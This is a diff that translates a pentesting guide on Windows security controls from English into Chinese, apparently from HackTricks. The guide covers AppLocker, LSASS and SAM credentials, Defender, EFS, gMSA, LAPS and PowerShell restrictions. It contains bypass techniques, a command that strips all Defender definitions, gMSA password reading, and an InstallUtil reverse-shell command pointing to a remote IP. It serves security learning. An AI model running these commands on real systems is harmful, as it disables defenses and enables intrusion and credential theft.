@@ -4,22 +4,21 @@
 
 <figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>
 
-Use [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
-Get Access Today:
+使用 [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) 轻松构建和 **自动化工作流程**，由世界上 **最先进** 的社区工具提供支持。\
+立即获取访问权限：
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
 ## AppLocker Policy
 
-An application whitelist is a list of approved software applications or executables that are allowed to be present and run on a system. The goal is to protect the environment from harmful malware and unapproved software that does not align with the specific business needs of an organization.
+应用程序白名单是一个经过批准的软件应用程序或可执行文件的列表，这些程序被允许在系统上存在和运行。其目标是保护环境免受有害恶意软件和不符合组织特定业务需求的未批准软件的影响。
 
-[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) is Microsoft's **application whitelisting solution** and gives system administrators control over **which applications and files users can run**. It provides **granular control** over executables, scripts, Windows installer files, DLLs, packaged apps, and packed app installers.\
-It is common for organizations to **block cmd.exe and PowerShell.exe** and write access to certain directories, **but this can all be bypassed**.
+[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) 是微软的 **应用程序白名单解决方案**，为系统管理员提供对 **用户可以运行哪些应用程序和文件** 的控制。它提供对可执行文件、脚本、Windows 安装程序文件、DLL、打包应用程序和打包应用程序安装程序的 **细粒度控制**。\
+组织通常会 **阻止 cmd.exe 和 PowerShell.exe** 以及对某些目录的写入访问，**但这一切都可以被绕过**。
 
 ### Check
 
-Check which files/extensions are blacklisted/whitelisted:
-
+检查哪些文件/扩展名被列入黑名单/白名单：
 ```powershell
 Get-ApplockerPolicy -Effective -xml
 
@@ -28,63 +27,60 @@ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 $a = Get-ApplockerPolicy -effective
 $a.rulecollections
 ```
-
-This registry path contains the configurations and policies applied by AppLocker, providing a way to review the current set of rules enforced on the system:
+此注册表路径包含由 AppLocker 应用的配置和策略，提供了一种查看系统上强制执行的当前规则集的方法：
 
 - `HKLM\Software\Policies\Microsoft\Windows\SrpV2`
 
-### Bypass
+### 绕过
 
-- Useful **Writable folders** to bypass AppLocker Policy: If AppLocker is allowing to execute anything inside `C:\Windows\System32` or `C:\Windows` there are **writable folders** you can use to **bypass this**.
-
+- 有用的 **可写文件夹** 用于绕过 AppLocker 策略：如果 AppLocker 允许在 `C:\Windows\System32` 或 `C:\Windows` 内执行任何内容，则可以使用 **可写文件夹** 来 **绕过此限制**。
 ```
 C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
 C:\Windows\System32\spool\drivers\color
 C:\Windows\Tasks
 C:\windows\tracing
 ```
+- 常见的 **trusted** [**"LOLBAS's"**](https://lolbas-project.github.io/) 二进制文件也可以用于绕过 AppLocker。
+- **编写不当的规则也可能被绕过**
+- 例如，**`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**，您可以在任何地方创建一个 **名为 `allowed`** 的文件夹，它将被允许。
+- 组织通常还会专注于 **阻止 `%System32%\WindowsPowerShell\v1.0\powershell.exe` 可执行文件**，但忘记了 **其他** [**PowerShell 可执行文件位置**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations)，例如 `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` 或 `PowerShell_ISE.exe`。
+- **DLL 强制执行很少启用**，因为它可能对系统造成额外负担，并且需要大量测试以确保不会出现故障。因此，使用 **DLL 作为后门将有助于绕过 AppLocker**。
+- 您可以使用 [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) 或 [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) 在任何进程中 **执行 Powershell** 代码并绕过 AppLocker。有关更多信息，请查看: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)。
 
-- Commonly **trusted** [**"LOLBAS's"**](https://lolbas-project.github.io/) binaries can be also useful to bypass AppLocker.
-- **Poorly written rules could also be bypassed**
-  - For example, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, you can create a **folder called `allowed`** anywhere and it will be allowed.
-  - Organizations also often focus on **blocking the `%System32%\WindowsPowerShell\v1.0\powershell.exe` executable**, but forget about the **other** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) such as `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` or `PowerShell_ISE.exe`.
-- **DLL enforcement very rarely enabled** due to the additional load it can put on a system, and the amount of testing required to ensure nothing will break. So using **DLLs as backdoors will help bypassing AppLocker**.
-- You can use [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) or [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) to **execute Powershell** code in any process and bypass AppLocker. For more info check: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).
+## 凭据存储
 
-## Credentials Storage
+### 安全账户管理器 (SAM)
 
-### Security Accounts Manager (SAM)
+本地凭据存储在此文件中，密码经过哈希处理。
 
-Local credentials are present in this file, the passwords are hashed.
+### 本地安全机构 (LSA) - LSASS
 
-### Local Security Authority (LSA) - LSASS
+**凭据**（哈希）被 **保存** 在此子系统的 **内存** 中，以实现单点登录。\
+**LSA** 管理本地 **安全策略**（密码策略、用户权限...）、**身份验证**、**访问令牌**...\
+LSA 将是 **检查** 提供的凭据的 **SAM** 文件（用于本地登录）并与 **域控制器** 进行通信以验证域用户。
 
-The **credentials** (hashed) are **saved** in the **memory** of this subsystem for Single Sign-On reasons.\
-**LSA** administrates the local **security policy** (password policy, users permissions...), **authentication**, **access tokens**...\
-LSA will be the one that will **check** for provided credentials inside the **SAM** file (for a local login) and **talk** with the **domain controller** to authenticate a domain user.
+**凭据** 被 **保存** 在 **进程 LSASS** 中：Kerberos 票证、NT 和 LM 哈希、易于解密的密码。
 
-The **credentials** are **saved** inside the **process LSASS**: Kerberos tickets, hashes NT and LM, easily decrypted passwords.
+### LSA 秘密
 
-### LSA secrets
+LSA 可能会在磁盘上保存一些凭据：
 
-LSA could save in disk some credentials:
-
-- Password of the computer account of the Active Directory (unreachable domain controller).
-- Passwords of the accounts of Windows services
-- Passwords for scheduled tasks
-- More (password of IIS applications...)
+- Active Directory 的计算机账户密码（无法访问的域控制器）。
+- Windows 服务账户的密码
+- 计划任务的密码
+- 更多（IIS 应用程序的密码...）
 
 ### NTDS.dit
 
-It is the database of the Active Directory. It is only present in Domain Controllers.
+这是 Active Directory 的数据库。它仅存在于域控制器中。
 
 ## Defender
 
-[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) is an Antivirus that is available in Windows 10 and Windows 11, and in versions of Windows Server. It **blocks** common pentesting tools such as **`WinPEAS`**. However, there are ways to **bypass these protections**.
+[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) 是 Windows 10 和 Windows 11 以及 Windows Server 版本中可用的防病毒软件。它 **阻止** 常见的渗透测试工具，如 **`WinPEAS`**。但是，有方法可以 **绕过这些保护**。
 
-### Check
+### 检查
 
-To check the **status** of **Defender** you can execute the PS cmdlet **`Get-MpComputerStatus`** (check the value of **`RealTimeProtectionEnabled`** to know if it's active):
+要检查 **Defender** 的 **状态**，您可以执行 PS cmdlet **`Get-MpComputerStatus`**（检查 **`RealTimeProtectionEnabled`** 的值以了解它是否处于活动状态）：
 
 <pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus
 
@@ -103,8 +99,7 @@ NISEngineVersion                : 0.0.0.0
 PSComputerName                  :
 </code></pre>
 
-To enumerate it you could also run:
-
+要枚举它，您还可以运行：
 ```bash
 WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
 wmic /namespace:\\root\securitycenter2 path antivirusproduct
@@ -113,113 +108,101 @@ sc query windefend
 #Delete all rules of Defender (useful for machines without internet access)
 "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
 ```
+## 加密文件系统 (EFS)
 
-## Encrypted File System (EFS)
+EFS 通过加密保护文件，使用称为 **文件加密密钥 (FEK)** 的 **对称密钥**。该密钥使用用户的 **公钥** 进行加密，并存储在加密文件的 $EFS **替代数据流** 中。当需要解密时，使用用户数字证书的相应 **私钥** 从 $EFS 流中解密 FEK。更多详细信息可以在 [这里](https://en.wikipedia.org/wiki/Encrypting_File_System) 找到。
 
-EFS secures files through encryption, utilizing a **symmetric key** known as the **File Encryption Key (FEK)**. This key is encrypted with the user's **public key** and stored within the encrypted file's $EFS **alternative data stream**. When decryption is needed, the corresponding **private key** of the user's digital certificate is used to decrypt the FEK from the $EFS stream. More details can be found [here](https://en.wikipedia.org/wiki/Encrypting_File_System).
+**无需用户启动的解密场景** 包括：
 
-**Decryption scenarios without user initiation** include:
+- 当文件或文件夹移动到非 EFS 文件系统（如 [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table)）时，它们会自动解密。
+- 通过 SMB/CIFS 协议在网络上传输的加密文件在传输前会被解密。
 
-- When files or folders are moved to a non-EFS file system, like [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), they are automatically decrypted.
-- Encrypted files sent over the network via SMB/CIFS protocol are decrypted prior to transmission.
+这种加密方法允许所有者对加密文件进行 **透明访问**。然而，仅仅更改所有者的密码并登录并不能允许解密。
 
-This encryption method allows **transparent access** to encrypted files for the owner. However, simply changing the owner's password and logging in will not permit decryption.
+**关键要点**：
 
-**Key Takeaways**:
+- EFS 使用对称 FEK，使用用户的公钥加密。
+- 解密使用用户的私钥访问 FEK。
+- 在特定条件下会自动解密，例如复制到 FAT32 或网络传输。
+- 加密文件对所有者可访问，无需额外步骤。
 
-- EFS uses a symmetric FEK, encrypted with the user's public key.
-- Decryption employs the user's private key to access the FEK.
-- Automatic decryption occurs under specific conditions, like copying to FAT32 or network transmission.
-- Encrypted files are accessible to the owner without additional steps.
+### 检查 EFS 信息
 
-### Check EFS info
+检查 **用户** 是否 **使用** 了此 **服务**，检查此路径是否存在：`C:\users\<username>\appdata\roaming\Microsoft\Protect`
 
-Check if a **user** has **used** this **service** checking if this path exists:`C:\users\<username>\appdata\roaming\Microsoft\Protect`
+使用 cipher /c \<file\> 检查 **谁** 有 **访问** 文件的权限\
+您还可以在文件夹内使用 `cipher /e` 和 `cipher /d` 来 **加密** 和 **解密** 所有文件
 
-Check **who** has **access** to the file using cipher /c \<file>\
-You can also use `cipher /e` and `cipher /d` inside a folder to **encrypt** and **decrypt** all the files
+### 解密 EFS 文件
 
-### Decrypting EFS files
+#### 成为权限系统
 
-#### Being Authority System
+这种方式要求 **受害者用户** 在主机内 **运行** 一个 **进程**。如果是这种情况，使用 `meterpreter` 会话可以模拟用户进程的令牌（`impersonate_token` 来自 `incognito`）。或者您可以直接 `migrate` 到用户的进程。
 
-This way requires the **victim user** to be **running** a **process** inside the host. If that is the case, using a `meterpreter` sessions you can impersonate the token of the process of the user (`impersonate_token` from `incognito`). Or you could just `migrate` to process of the user.
-
-#### Knowing the users password
+#### 知道用户密码
 
 {% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}
 
-## Group Managed Service Accounts (gMSA)
+## 组管理服务账户 (gMSA)
 
-Microsoft developed **Group Managed Service Accounts (gMSA)** to simplify the management of service accounts in IT infrastructures. Unlike traditional service accounts that often have the "**Password never expire**" setting enabled, gMSAs offer a more secure and manageable solution:
+微软开发了 **组管理服务账户 (gMSA)** 以简化 IT 基础设施中服务账户的管理。与传统的服务账户（通常启用“**密码永不过期**”设置）不同，gMSA 提供了更安全和可管理的解决方案：
 
-- **Automatic Password Management**: gMSAs use a complex, 240-character password that automatically changes according to domain or computer policy. This process is handled by Microsoft's Key Distribution Service (KDC), eliminating the need for manual password updates.
-- **Enhanced Security**: These accounts are immune to lockouts and cannot be used for interactive logins, enhancing their security.
-- **Multiple Host Support**: gMSAs can be shared across multiple hosts, making them ideal for services running on multiple servers.
-- **Scheduled Task Capability**: Unlike managed service accounts, gMSAs support running scheduled tasks.
-- **Simplified SPN Management**: The system automatically updates the Service Principal Name (SPN) when there are changes to the computer's sAMaccount details or DNS name, simplifying SPN management.
+- **自动密码管理**：gMSA 使用复杂的 240 字符密码，自动根据域或计算机策略进行更改。此过程由微软的密钥分发服务 (KDC) 处理，消除了手动更新密码的需要。
+- **增强安全性**：这些账户免受锁定，并且不能用于交互式登录，从而增强了安全性。
+- **多主机支持**：gMSA 可以在多个主机之间共享，非常适合在多个服务器上运行的服务。
+- **计划任务能力**：与管理服务账户不同，gMSA 支持运行计划任务。
+- **简化 SPN 管理**：当计算机的 sAMaccount 详细信息或 DNS 名称发生更改时，系统会自动更新服务主体名称 (SPN)，简化 SPN 管理。
 
-The passwords for gMSAs are stored in the LDAP property _**msDS-ManagedPassword**_ and are automatically reset every 30 days by Domain Controllers (DCs). This password, an encrypted data blob known as [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), can only be retrieved by authorized administrators and the servers on which the gMSAs are installed, ensuring a secure environment. To access this information, a secured connection such as LDAPS is required, or the connection must be authenticated with 'Sealing & Secure'.
+gMSA 的密码存储在 LDAP 属性 _**msDS-ManagedPassword**_ 中，并由域控制器 (DC) 每 30 天自动重置。此密码是一个称为 [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) 的加密数据块，仅可由授权管理员和安装 gMSA 的服务器检索，从而确保安全环境。要访问此信息，需要安全连接，例如 LDAPS，或者连接必须经过“密封和安全”认证。
 
 ![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)
 
-You can read this password with [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
-
+您可以使用 [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**：
 ```
 /GMSAPasswordReader --AccountName jkohler
 ```
+[**在此帖子中找到更多信息**](https://cube0x0.github.io/Relaying-for-gMSA/)
 
-[**Find more info in this post**](https://cube0x0.github.io/Relaying-for-gMSA/)
-
-Also, check this [web page](https://cube0x0.github.io/Relaying-for-gMSA/) about how to perform a **NTLM relay attack** to **read** the **password** of **gMSA**.
+此外，请查看此[网页](https://cube0x0.github.io/Relaying-for-gMSA/)关于如何执行**NTLM中继攻击**以**读取** **gMSA**的**密码**。
 
 ## LAPS
 
-The **Local Administrator Password Solution (LAPS)**, available for download from [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), enables the management of local Administrator passwords. These passwords, which are **randomized**, unique, and **regularly changed**, are stored centrally in Active Directory. Access to these passwords is restricted through ACLs to authorized users. With sufficient permissions granted, the ability to read local admin passwords is provided.
+**本地管理员密码解决方案 (LAPS)**，可从[Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899)下载，允许管理本地管理员密码。这些密码是**随机生成**、唯一且**定期更改**的，集中存储在Active Directory中。对这些密码的访问通过ACL限制为授权用户。授予足够的权限后，可以读取本地管理员密码。
 
 {{#ref}}
 ../active-directory-methodology/laps.md
 {{#endref}}
 
-## PS Constrained Language Mode
+## PS受限语言模式
 
-PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **locks down many of the features** needed to use PowerShell effectively, such as blocking COM objects, only allowing approved .NET types, XAML-based workflows, PowerShell classes, and more.
+PowerShell [**受限语言模式**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **锁定了许多**有效使用PowerShell所需的功能，例如阻止COM对象，仅允许批准的.NET类型、基于XAML的工作流、PowerShell类等。
 
-### **Check**
-
+### **检查**
 ```powershell
 $ExecutionContext.SessionState.LanguageMode
 #Values could be: FullLanguage or ConstrainedLanguage
 ```
-
-### Bypass
-
+### 绕过
 ```powershell
 #Easy bypass
 Powershell -version 2
 ```
+在当前的Windows中，绕过方法将不起作用，但您可以使用[ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM)。\
+**要编译它，您可能需要** **_添加引用_** -> _浏览_ -> _浏览_ -> 添加 `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` 并**将项目更改为 .Net4.5**。
 
-In current Windows that Bypass won't work but you can use[ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
-**To compile it you may need** **to** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> add `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` and **change the project to .Net4.5**.
-
-#### Direct bypass:
-
+#### 直接绕过：
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
 ```
-
-#### Reverse shell:
-
+#### 反向 shell:
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
 ```
+您可以使用 [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) 或 [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) 来 **执行 Powershell** 代码在任何进程中并绕过受限模式。有关更多信息，请查看: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)。
 
-You can use [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) or [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) to **execute Powershell** code in any process and bypass the constrained mode. For more info check: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).
+## PS 执行策略
 
-## PS Execution Policy
-
-By default it is set to **restricted.** Main ways to bypass this policy:
-
+默认情况下，它设置为 **restricted.** 绕过此策略的主要方法：
 ```powershell
 1º Just copy and paste inside the interactive PS console
 2º Read en Exec
@@ -239,33 +222,32 @@ Powershell -command "Write-Host 'My voice is my passport, verify me.'"
 9º Use EncodeCommand
 $command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
 ```
+更多信息可以在 [这里](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/) 找到
 
-More can be found [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
+## 安全支持提供者接口 (SSPI)
 
-## Security Support Provider Interface (SSPI)
+是用于验证用户的 API。
 
-Is the API that can be use to authenticate users.
+SSPI 将负责为想要通信的两台机器找到合适的协议。首选方法是 Kerberos。然后，SSPI 将协商使用哪个身份验证协议，这些身份验证协议称为安全支持提供者 (SSP)，以 DLL 形式位于每台 Windows 机器内部，且两台机器必须支持相同的协议才能进行通信。
 
-The SSPI will be in charge of finding the adequate protocol for two machines that want to communicate. The preferred method for this is Kerberos. Then the SSPI will negotiate which authentication protocol will be used, these authentication protocols are called Security Support Provider (SSP), are located inside each Windows machine in the form of a DLL and both machines must support the same to be able to communicate.
+### 主要 SSPs
 
-### Main SSPs
+- **Kerberos**: 首选
+- %windir%\Windows\System32\kerberos.dll
+- **NTLMv1** 和 **NTLMv2**: 兼容性原因
+- %windir%\Windows\System32\msv1_0.dll
+- **Digest**: Web 服务器和 LDAP，密码以 MD5 哈希形式存在
+- %windir%\Windows\System32\Wdigest.dll
+- **Schannel**: SSL 和 TLS
+- %windir%\Windows\System32\Schannel.dll
+- **Negotiate**: 用于协商使用的协议（Kerberos 或 NTLM，默认是 Kerberos）
+- %windir%\Windows\System32\lsasrv.dll
 
-- **Kerberos**: The preferred one
-  - %windir%\Windows\System32\kerberos.dll
-- **NTLMv1** and **NTLMv2**: Compatibility reasons
-  - %windir%\Windows\System32\msv1_0.dll
-- **Digest**: Web servers and LDAP, password in form of a MD5 hash
-  - %windir%\Windows\System32\Wdigest.dll
-- **Schannel**: SSL and TLS
-  - %windir%\Windows\System32\Schannel.dll
-- **Negotiate**: It is used to negotiate the protocol to use (Kerberos or NTLM being Kerberos the default one)
-  - %windir%\Windows\System32\lsasrv.dll
+#### 协商可能提供多种方法或仅提供一种。
 
-#### The negotiation could offer several methods or only one.
+## UAC - 用户帐户控制
 
-## UAC - User Account Control
-
-[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is a feature that enables a **consent prompt for elevated activities**.
+[用户帐户控制 (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) 是一个启用 **提升活动的同意提示** 的功能。
 
 {{#ref}}
 uac-user-account-control.md
@@ -274,12 +256,11 @@ uac-user-account-control.md
 <figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Use [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
-Get Access Today:
+使用 [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) 轻松构建和 **自动化工作流程**，由世界上 **最先进** 的社区工具提供支持。\
+立即获取访问权限：
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
 ---
 
 {{#include ../../banners/hacktricks-training.md}}
-
